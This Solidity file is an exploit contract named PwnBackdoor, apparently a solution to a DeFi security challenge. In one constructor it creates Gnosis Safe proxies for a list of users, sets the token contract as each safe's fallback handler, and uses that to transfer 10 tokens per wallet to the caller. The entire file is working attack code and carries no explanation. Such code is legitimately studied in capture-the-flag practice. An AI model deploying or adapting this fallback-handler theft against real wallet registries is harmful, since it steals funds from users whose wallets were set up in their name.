// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";

contract PwnBackdoor {
    constructor(
	IProxyCreationCallback registryAddress,
	address[] memory userAddresses,
	address masterCopy,
	address tokenAddress,
	address payable proxyFactoryAddress
	) {
	GnosisSafeProxyFactory factory = GnosisSafeProxyFactory(proxyFactoryAddress);
	for (uint i; i < userAddresses.length; i++) {
	    address user = userAddresses[i];
	    address[] memory owners = new address[](1);
	    owners[0] = user;
	    GnosisSafeProxy proxy = factory.createProxyWithCallback(
		masterCopy,
		abi.encodeWithSelector(
		    GnosisSafe.setup.selector,
		    owners,       // _owners
		    1,            // threshold
		    address(0),   // to
		    0x0,          // data
		    tokenAddress, // fallbackHandler
		    address(0),   // paymentToken
		    0,            // payment
		    address(0)    // paymentReceiver
		),
		0,
		registryAddress
	    );
	    IERC20(address(proxy)).transfer(msg.sender, 10 ether);
	}
    }
}
